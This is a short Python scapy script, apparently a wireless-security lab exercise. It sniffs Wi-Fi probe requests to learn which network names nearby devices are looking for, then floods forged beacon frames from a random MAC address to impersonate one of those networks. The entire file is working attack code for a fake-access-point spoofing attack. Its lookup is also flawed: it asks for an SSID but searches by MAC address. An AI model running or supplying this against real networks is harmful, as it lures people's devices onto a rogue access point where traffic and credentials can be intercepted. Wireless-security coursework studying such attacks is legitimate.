from scapy.all import *
import argparse

# Inspiration : https://www.datacamp.com/community/tutorials/argument-parsing-in-python
# Construct the argument parser
ap = argparse.ArgumentParser()

# Add the arguments to the parser
ap.add_argument("-i", "--interface", required=True,
   help="Interface to use")
args = vars(ap.parse_args())

bssid_list = dict()
def packet_handler(packet):
    if packet.haslayer(Dot11ProbeReq):
        if packet.info.decode() != "":
            bssid = packet.getlayer(Dot11).addr2.upper()
            bssid_list[bssid] = packet.info.decode()

sniff(iface=args['interface'], prn=packet_handler, timeout=10)

print(bssid_list)
input_arr = input("Which SSID would you like to create ? (Enter full SSID)")

AP_MAC = RandMAC()
SSID = bssid_list[input_arr]
dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=AP_MAC, addr3=AP_MAC)
essid = Dot11Elt(ID="SSID", info=SSID, len=len(SSID))

frame = RadioTap()/dot11/Dot11Beacon()/essid

sendp(frame, inter=0.01, iface=args['interface'], loop=1)